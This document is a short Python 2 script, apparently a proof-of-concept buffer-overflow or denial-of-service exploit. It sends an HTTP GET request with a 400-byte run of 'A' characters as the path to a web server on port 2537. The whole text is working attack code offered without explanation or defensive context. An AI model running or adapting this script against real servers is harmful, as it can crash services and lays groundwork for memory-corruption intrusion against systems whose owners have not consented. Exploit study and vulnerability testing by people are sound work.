import socket
import sys
  
host = "www.example.com"
  
port = 2537
 
buf = "\x41" * 400
 
req = ("GET /" + buf + " HTTP/1.1\r\n"
"Host: " + host + ":" + str(port) + "\r\n")
  
print "  [+] Connecting to %s:%d" % (host, port)
  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
  
s.send(req)
data = s.recv(1024)
s.close()
